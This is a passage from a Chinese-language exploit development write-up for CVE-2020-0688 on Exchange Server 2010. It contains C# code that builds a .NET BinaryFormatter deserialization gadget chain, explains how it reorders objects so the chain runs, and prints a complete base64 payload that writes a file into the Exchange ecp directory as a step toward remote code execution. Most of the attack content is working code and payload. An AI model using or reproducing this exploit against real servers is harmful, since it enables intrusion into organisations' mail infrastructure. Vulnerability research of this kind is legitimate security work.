        {
            public static Comparison d { get; set; }
            public static Delegate da { get; set; }
            static void Main(string[] args)
            {
                ConfigurationSettings.AppSettings.Set(
                    "microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck",
                    "true"
                        );
                da = new Comparison(String.Compare);
                d = (Comparison)MulticastDelegate.Combine(da, da);
                IComparer comp = new System.Array.FunctorComparer(d);
                TreeSet set = new TreeSet(comp);
                set.Add(@"LiveIdError.aspx");
                set.Add("");
                FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
                object[] invoke_list = d.GetInvocationList();
                invoke_list[1] = new Action(File.WriteAllText);
                fi.SetValue(d, invoke_list);
                MemoryStream stream = new MemoryStream();
                BinaryFormatter fmt = new BinaryFormatter();
                SurrogateSelector ss = new MySu();
                fmt.SurrogateSelector = ss;
                fmt.Serialize(stream, set);
                Console.WriteLine(Convert.ToBase64String(stream.ToArray()));
                Console.ReadKey();
                stream.Position = 0;
                fmt.Deserialize(stream);
            }
            internal class MySu : SurrogateSelector
            {
                public override ISerializationSurrogate GetSurrogate(Type type,
                    StreamingContext context, out ISurrogateSelector selector)
                {
                    selector = this;
                    if (!type.IsSerializable)
                    {
                        Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                        return (ISerializationSurrogate)Activator.CreateInstance(t);
                    }
                    return base.GetSurrogate(type, context, out selector);
                }
            }
        }
实际执行发现序列化没有问题了，但反序列化却会报错空引用异常System.NullReferenceException，未将对象引用设置到对象的实例。
上dnSpy调试发现反序列化TreeSet时，接收到的构造参数Comparer竟然是null而不是预期的System.Array.FunctorComparer，这一点比较奇怪。
修改测试代码发现反序列化TreeSet时，System.Array.FunctorComparer还处于尚未反序列化状态，当然也就无法传给TreeSet，这可太奇怪了。
### 0x43 调整反序列化顺序
既然我遇到了这个问题，前辈们肯定也遇到过，因此继续尝试理解ActivitySurrogateSelector链。对比本次漏洞利用除了序列化任意类之外，两条链实际上关联不大，一开始以为需要引入Linq处理顺序问题，但迅速意识到那将会大幅增加Payload长度而被否决。反复研读原文和代码后发现
[ActivitySurrogateSelector链的代码](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs)在第84行有这样一句注释
    // Pre-load objects, this ensures they're fixed up before building the hash table.
随后将需要序列化的对象加入一个List中，并且最后也将角色类似本文TreeSet的Hashtable加入List，最后序列化整个List对象生成Payload。
照这么看，推测很可能是由于某个特性，默认情况下这些不可序列化的类最后才会被反序列化，而引入List来自定义各个对象的顺序可以解决这个问题。
### 0x44 最终实现
因此参照思路，再次修改测试代码如下
     class Program
        {
            public static Comparison d { get; set; }
            public static Delegate da { get; set; }
            static void Main(string[] args)
            {
                ConfigurationSettings.AppSettings.Set(
                    "microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck",
                    "true"
                        );
                da = new Comparison(String.Compare);
                d = (Comparison)MulticastDelegate.Combine(da, da);
                IComparer comp = new System.Array.FunctorComparer(d);
                TreeSet set = new TreeSet(comp);
                set.Add(@"LiveIdError.aspx");
                set.Add("");
                FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
                object[] invoke_list = d.GetInvocationList();
                invoke_list[1] = new Action(File.WriteAllText);
                fi.SetValue(d, invoke_list);
                MemoryStream stream = new MemoryStream();
                BinaryFormatter fmt = new BinaryFormatter();
                SurrogateSelector ss = new MySu();
                fmt.SurrogateSelector = ss;
                List ls = new List();
                ls.Add(comp);
                ls.Add(set);
                Console.WriteLine("[++] Serializing");
                fmt.Serialize(stream, ls);
                String payload = Convert.ToBase64String(stream.ToArray());
                stream.Position = 0;
                Console.WriteLine("[++] Deserializing");
                fmt.Deserialize(stream);
                Console.WriteLine(payload);
                Console.Writeline("Payload Length: " + payload.Length);
                Console.ReadKey();
            }
            internal class MySu : SurrogateSelector
            {
                public override ISerializationSurrogate GetSurrogate(Type type,
                    StreamingContext context, out ISurrogateSelector selector)
                {
                    selector = this;
                    Console.WriteLine("[*] "+type);
                    if (!type.IsSerializable)
                    {
                        Console.WriteLine("[+] "+type);
                        Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                        return (ISerializationSurrogate)Activator.CreateInstance(t);
                    }
                    return base.GetSurrogate(type, context, out selector);
                }
            }
        }
编译执行，反序列化顺利完成写入文件操作，证明思路正确。但生成的Payload有点长，达到三千多字节，参照ysoserial.net项目的精简思路，裁剪到大约1900字节以内，即可实现在默认路径的ecp下写入LiveIdError.aspx空白文件，payload如下:
    AAEAAAD/////AQAAAAAAAAAEAQAAADJTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3RdXQIAAAAGX2l0ZW1zBV9zaXplBQAICQIAAAACAAAAEAIAAAAEAAAACQMAAAAJBAAAAA0CDAUAAAAeU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsBQMAAABqU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFAXgFAAAACQYAAAAJBwAAAAwIAAAABlN5c3RlbQUEAAAANVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlRyZWVTZXRgMVtbU3lzdGVtLlN0cmluZ11dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAQABggBeAUAAAAICAAAAAIAAAAJAwAAAAEAAAAJCgAAAAQGAAAAH1N5c3RlbS5Vbml0eVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAABERhdGEJVW5pdHlUeXBlDEFzc2VtYmx5TmFtZQEAAQgGCwAAAC9TeXN0ZW0uQXJyYXkrRnVuY3RvckNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmddXQQAAAAGDAAAAAhtc2NvcmxpYhAHAAAAAgAAAAkNAAAACQ4AAAARCgAAAAIAAAAGDwAAAAAGEAAAAFBDOlxQcm9ncmFtIEZpbGVzXE1pY3Jvc29mdFxFeGNoYW5nZSBTZXJ2ZXJcVjE0XENsaWVudEFjY2Vzc1xlY3BcTGl2ZUlkRXJyb3IuYXNweAQNAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlAAF4AQEBCREAAAANAA0ABA4AAAA9U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuR2VuZXJpY0NvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmddXQAAAAAEEQAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkAEnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQEBAQEBBhQAAABEU3lzdGVtLkFjdGlvbmAyW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYl0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliXV0GFQAAAE5TeXN0ZW0uQ29yZSwgVmVyc2lvbj0zLjUuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkNAAkMAAAABhcAAAAOU3lzdGVtLklPLkZpbGUGGAAAAAxXcml0ZUFsbFRleHQJGQAAAAQSAAAAAXgGAAAAAAAAAAAAAQEBAQABCA0ADQANAA0AAAAAAA0AARMAAAASAAAABh4AAAAHQ29tcGFyZQ0ABiAAAAANU3lzdGVtLlN0cmluZw0ACAAAAAoBGQAAABEAAAAGIgAAACRTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nXV0JDAAAAA0ACQwAAAAJIAAAAAkeAAAACw==
后续使用zcgonvh前辈的exp即可如高版本一样实现任意代码执行，这里附一份整合本文的exp，使用方法不变，遇到Exchange Server
2010加上-v35参数即可，稍后提一份PR如果头像哥不嫌弃我代码垃圾也许会合并到exp项目。
## 0x50 弹个计算器？
由于payload长度限制的原因，直接执行命令在这个漏洞中已经意义不大，然而不管完美不完美，弹个计算器是每一个代码执行漏洞的基本要求，按同样的思路这里再测试一段弹计算器的Payload。
## 0x60 一点感想
这几年各种各样的漏洞层出不穷，各种一键GetShell比比皆是，然而烂尾的漏洞也不少，披露信息只有寥寥数语就再也没有后续或者实际利用存在各种限制，也许很多漏洞都值得重新调试来发现更多可能。
调试这个漏洞的过程中学到了大量.Net和反序列化相关的知识，非常感谢@zcgonvh
前辈的帮助，给了我强大的信心，但在下对这些知识的理解仍然十分粗浅，文中仍可能有错漏之处，敬请读者指正。
唯一纠结是LiveIdError.aspx这个全版本默认都不存在的文件本身作用到底是什么，检索了一些资料仍无法理解，结合默认沿用多年的MachineKey，多多少少让这个漏洞有点后门的嫌疑。
在调试完在CVE-2020-0688低版本的利用之后，再次回顾@zcgonvh
的分析文章，才发现竟然早已包含本文几乎所有必要知识，不得不说zcgonvh前辈真是功力深厚，而且对迟钝如我这样的菜鸟路人，仍愿意不厌其烦的提点，实在令人敬佩，神秘的A-TEAM又令人多向往了一分。
## 参考资料
* * *